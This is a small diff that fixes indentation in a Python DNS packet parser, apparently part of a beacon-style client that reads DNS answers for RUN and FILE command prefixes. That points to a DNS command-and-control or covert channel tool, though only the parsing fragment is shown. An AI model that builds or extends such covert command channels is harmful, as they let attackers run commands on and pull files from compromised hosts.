@@ -45,7 +45,7 @@ def send_beacon(addr,data):
 
 def parse_packet(packet):
     
-   if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 1:
+    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 1:
         global cond
         print("client in parse")
         cond = 1
@@ -54,11 +54,11 @@ def parse_packet(packet):
         print("answer:")
         print(get_an)
   
-	 if get_an.startswith(RUN):
-         	prefix_packet = RUN
-         	
-         elif get_an.startswith(FILE):
-         	prefix_packet = FILE
+    if get_an.startswith(RUN):
+        prefix_packet = RUN
+        
+    elif get_an.startswith(FILE):
+        prefix_packet = FILE
 
         print("prefix:")
         print(prefix_packet)
